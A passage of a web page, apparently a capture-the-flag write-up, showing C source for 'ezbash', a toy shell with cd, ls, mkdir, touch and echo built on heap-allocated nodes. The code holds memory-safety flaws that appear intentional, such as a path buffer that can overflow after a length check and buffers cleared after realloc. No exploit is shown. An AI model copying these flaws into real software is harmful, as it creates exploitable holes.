class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare_name</span><span class="params">(Command*, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_name</span><span class="params">(Command*, Command*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink_name</span><span class="params">(Command*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_name</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search_name</span><span class="params">(Command**, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_name</span><span class="params">(Command*, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_echo</span><span class="params">(Command*, Command*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_dir</span><span class="params">(Command*, Command*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cd</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ls</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mkdir</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">touch</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cat</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rm</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cp</span><span class="params">(<span class="keyword">char</span>**)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">help</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">Command* dir_root = <span class="literal">NULL</span>;</span><br><span class="line">Command* current = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> path[<span class="number">80</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* command_list_system[<span class="number">11</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;cd&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;rm&quot;</span>,<span class="string">&quot;mkdir&quot;</span>,<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="string">&quot;help&quot;</span>,<span class="string">&quot;exit&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Command* <span class="title">malloc_empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Command* chunk;</span><br><span class="line"></span><br><span class="line">    chunk = (Command*)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">memset</span>(chunk-&gt;name, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">    chunk-&gt;echo_data = <span class="literal">NULL</span>;</span><br><span class="line">    chunk-&gt;name_list = <span class="literal">NULL</span>;</span><br><span class="line">    chunk-&gt;last_name = <span class="literal">NULL</span>;</span><br><span class="line">    chunk-&gt;next_name = <span class="literal">NULL</span>;</span><br><span class="line">    chunk-&gt;parent_dir = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> chunk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    dir_root = malloc_empty();</span><br><span class="line">    dir_root-&gt;key = ISDIR;</span><br><span class="line">    dir_root-&gt;name[<span class="number">0</span>] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    current = dir_root;</span><br><span class="line">    <span class="built_in">strncpy</span>(path, dir_root-&gt;name, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">input_command</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> command_len;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> command;</span><br><span class="line">    <span class="keyword">char</span>* command_str;</span><br><span class="line">    command_len = <span class="number">0x150</span>;</span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    command_str = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x150</span>);</span><br><span class="line">    <span class="keyword">if</span> (!command_str)</span><br><span class="line">    &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>,<span class="number">1</span>,<span class="number">0x19</span>,<span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(command_str, <span class="number">0</span>, <span class="number">0x150</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        command = getchar();</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="number">-1</span> || command == <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        command_str[index++] = command;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= command_len)</span><br><span class="line">        &#123;</span><br><span class="line">            command_len += <span class="number">0x150</span>;</span><br><span class="line">            command_str = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(command_str, command_len);</span><br><span class="line">            <span class="keyword">if</span> (!command_str)</span><br><span class="line">            &#123;</span><br><span class="line">                fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1</span>, <span class="number">0x19</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(command_str, <span class="number">0</span>, command_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    command_str[index] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> command_str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>** <span class="title">break_command</span><span class="params">(<span class="keyword">char</span>* command_str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> command_num;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">char</span>** command_list;</span><br><span class="line">    <span class="keyword">char</span>* command;</span><br><span class="line"></span><br><span class="line">    command_num = <span class="number">64</span>;</span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    command_list = (<span class="keyword">char</span>**)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">if</span> (!command_list)</span><br><span class="line">    &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>,<span class="number">1</span>,<span class="number">0x19</span>,<span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(command_list, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">for</span> (command = strtok(command_str, <span class="string">&quot; \t\r\n\a&quot;</span>); command; command = strtok(<span class="number">0</span>, <span class="string">&quot; \t\r\n\a&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        command_list[index++] = command;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= command_num)</span><br><span class="line">        &#123;</span><br><span class="line">            command_num += <span class="number">64</span>;</span><br><span class="line">            command_list = (<span class="keyword">char</span>**)<span class="built_in">realloc</span>(command_list, <span class="number">8</span> * command_num);</span><br><span class="line">            <span class="keyword">if</span> (!command_list)</span><br><span class="line">            &#123;</span><br><span class="line">                fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1</span>, <span class="number">0x19</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    command_list[index] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> command_list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">analyse_command</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!*command_list)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; <span class="number">11</span>; ++index)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(*command_list, command_list_system[index]))</span><br><span class="line">            <span class="keyword">return</span> command_entry(index,command_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: command not found\n&quot;</span>,*command_list);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span>* command_str;</span><br><span class="line">    <span class="keyword">char</span>** command_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33mhacker:%s$ \x1B[0m&quot;</span>,path);</span><br><span class="line">        command_str = input_command();</span><br><span class="line">        command_list = break_command(command_str);</span><br><span class="line">        ret = analyse_command(command_list);</span><br><span class="line">        <span class="built_in">free</span>(command_str);</span><br><span class="line">        <span class="built_in">free</span>(command_list);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">command_entry</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">char</span>** command_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (index)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = cd(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = ls(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = echo(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        ret = cat(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        ret = touch(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        ret = rm(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ret = mkdir(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        ret = cp(command_list);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        ret = pwd();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        ret = help();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cd</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name_input;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    <span class="keyword">char</span> delim[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (command_list[<span class="number">2</span>] != <span class="literal">NULL</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            fwrite(<span class="string">&quot;ezbash: too many arguments\n&quot;</span>, <span class="number">1</span>, <span class="number">0x1b</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(delim, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (name_input = strtok(command_list[<span class="number">1</span>], delim); name_input; name_input = strtok(<span class="number">0</span>, delim))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_input, <span class="string">&quot;.&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_input, <span class="string">&quot;..&quot;</span>) == <span class="number">0</span>) </span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (current-&gt;parent_dir)</span><br><span class="line">                        &#123;</span><br><span class="line">                            len = <span class="built_in">strlen</span>(current-&gt;name);</span><br><span class="line">                            path[<span class="built_in">strlen</span>(path) - <span class="number">1</span> - len] = <span class="number">0</span>;</span><br><span class="line">                            current = current-&gt;parent_dir;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        name_list = current-&gt;name_list;</span><br><span class="line">                        <span class="keyword">if</span> (compare_name(name_list, name_input) == <span class="number">1</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file or directory\n&quot;</span>, name_input);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> (name_list &amp;&amp; <span class="built_in">strcmp</span>(name_list-&gt;name, name_input))</span><br><span class="line">                            name_list = name_list-&gt;next_name;</span><br><span class="line">                        <span class="keyword">if</span> (check_isdir(name_list) == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            fwrite(<span class="string">&quot;ezbash: object must be directory\n&quot;</span>,<span class="number">1</span>,<span class="number">0x19</span>,<span class="built_in">stderr</span>);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        current = name_list;</span><br><span class="line">                        len = <span class="built_in">strlen</span>(path);</span><br><span class="line">                        <span class="keyword">if</span> (len + <span class="built_in">strlen</span>(name_list-&gt;name) &lt;= <span class="number">0x50</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">strcat</span>(path, name_list-&gt;name);</span><br><span class="line">                            path[<span class="built_in">strlen</span>(path)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: no arguments\n&quot;</span>, <span class="number">1</span>, <span class="number">0x15</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mkdir</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> delim[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    Command* chunk;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    Command* name_new;</span><br><span class="line"></span><br><span class="line">    index = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(delim, <span class="string">&quot;./&quot;</span>, <span class="keyword">sizeof</span>(delim));</span><br><span class="line">    <span class="keyword">if</span> (!command_list[<span class="number">1</span>])</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1</span>, <span class="number">0x18</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">while</span> (command_list[index])</span><br><span class="line">    &#123;</span><br><span class="line">        name_list = current-&gt;name_list;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strchr</span>(command_list[index], delim[<span class="number">0</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strchr</span>(command_list[index], delim[<span class="number">1</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (compare_name(name_list, command_list[index]) != <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot create directory &#x27;%s&#x27;: already exists\n&quot;</span>, command_list[index++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            chunk = malloc_empty();</span><br><span class="line">            name_new = chunk;</span><br><span class="line">            chunk-&gt;key = ISDIR;</span><br><span class="line">            chunk-&gt;parent_dir = current;</span><br><span class="line">            copy_name(chunk, command_list[index]);</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;name_list)</span><br><span class="line">                insert_name(name_list, name_new);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                current-&gt;name_list = name_new;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">touch</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> delim[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    Command* chunk;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    Command* name_new;</span><br><span class="line"></span><br><span class="line">    index = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(delim, <span class="string">&quot;./&quot;</span>, <span class="keyword">sizeof</span>(delim));</span><br><span class="line">    <span class="keyword">if</span> (!command_list[<span class="number">1</span>])</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1</span>, <span class="number">0x18</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">while</span> (command_list[index])</span><br><span class="line">    &#123;</span><br><span class="line">        name_list = current-&gt;name_list;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strchr</span>(command_list[index], delim[<span class="number">0</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strchr</span>(command_list[index], delim[<span class="number">1</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (compare_name(name_list, command_list[index]) != <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot create directory &#x27;%s&#x27;: already exists\n&quot;</span>, command_list[index++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            chunk = malloc_empty();</span><br><span class="line">            name_new = chunk;</span><br><span class="line">            chunk-&gt;key = ISFILE;</span><br><span class="line">            chunk-&gt;parent_dir = current;</span><br><span class="line">            copy_name(chunk, command_list[index]);</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;name_list)</span><br><span class="line">                insert_name(name_list, name_new);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                current-&gt;name_list = name_new;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ls</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    Command* current_temp;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name_input;</span><br><span class="line">    <span class="keyword">char</span> delim[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(delim, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        print_name();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (command_list[<span class="number">2</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (name_input = strtok(command_list[<span class="number">1</span>], delim); name_input; name_input = strtok(<span class="number">0</span>, delim))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_input, <span class="string">&quot;.&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                current_temp = current;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(name_input, <span class="string">&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (current-&gt;parent_dir)</span><br><span class="line">                    &#123;</span><br><span class="line">                        current = current-&gt;parent_dir;</span><br><span class="line">                        print_name();</span><br><span class="line">                        current = current_temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    name_list = current-&gt;name_list;</span><br><span class="line">                    <span class="keyword">if</span> (compare_name(name_list, name_input) == <span class="number">1</span>) </span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file or directory\n&quot;</span>, name_input);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;   </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (name_list &amp;&amp; <span class="built_in">strcmp</span>(name_list-&gt;name, name_input))</span><br><span class="line">                        name_list = name_list-&gt;next_name;</span><br><span class="line">                    <span class="keyword">if</span> (check_isdir(name_list) == <span class="number">0</span>) </span><br><span class="line">                    &#123;</span><br><span class="line">                        fwrite(<span class="string">&quot;ezbash: object must be directory\n&quot;</span>, <span class="number">1</span>, <span class="number">0x21</span>, <span class="built_in">stderr</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    current = name_list;</span><br><span class="line">                    print_name();</span><br><span class="line">                    current = current_temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span>** command_list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> echo_len;</span><br><span class="line">    <span class="keyword">int</span> echo_len_have;</span><br><span class="line">    <span class="keyword">int</span> echo_len_align;</span><br><span class="line">    <span class="keyword">int</span> need_len;</span><br><span class="line">    <span class="keyword">int</span> alloc_len;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    Command* name_list;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name;</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command_list[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (command_list[<span class="number">2</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, command_list[<span class="number">1</span>]);;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (check_isrelocation(command_list[<span class="number">2</span>]) == <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, command_list[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            name_list = current-&gt;name_list;</span><br><span class="line">            name = command_list[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> (search_name(&amp;name_list, name) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file\n&quot;</span>, name);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (check_isfile(name_list) == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (name_list-&gt;echo_data)</span><br><span class="line">                &#123;</span><br><span class="line">                    echo_len_have = <span class="built_in">strlen</span>(name_list-&gt;echo_data);</span><br><span class="line">                    <span class="built_in">memset</span>(name_list-&gt;echo_data, <span class="number">0</span>, echo_len_have);</span><br><span class="line">                    echo_len_align = (echo_len_have / <span class="number">0x150</span> + <span class="number">1</span>) * <span class="number">0x150</span>;</span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    alloc_len = <span class="number">0x150</span>;</span><br><span class="line">                    name_list-&gt;echo_data = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(alloc_len);</span><br><span class="line">                    <span class="keyword">if</span> (name_list-&gt;echo_data != <span class="literal">NULL</span>)</span><br><span class="line">                        <span class="built_in">memset</span>(name_list-&gt;echo_data, <span class="number">0</span>, alloc_len);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;an unexpected error occurred\n&quot;</span>);</span><br><span class="line">                    echo_len_align = <span class="number">0x150</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                need_len = <span class="built_in">strlen</span>(command_list[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (echo_len_align &gt; need_len)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    echo_len_align += <span class="number">0x150</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                alloc_len = echo_len_align;</span><br><span class="line">                name_list-&gt;echo_data = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(name_list-&gt;echo_data,alloc_len);</span><br><span class="line">                <span class="keyword">if</span>(name_list-&gt;echo_data != <span class="number">0</span>)</span><br><span class="line">                    <span class="built_in">memset</span>(name_list-&gt;echo_data, <span class="number">0</span>, alloc_len);</span><br><span class="line">                <span class="keyword">else</span></span><br><span 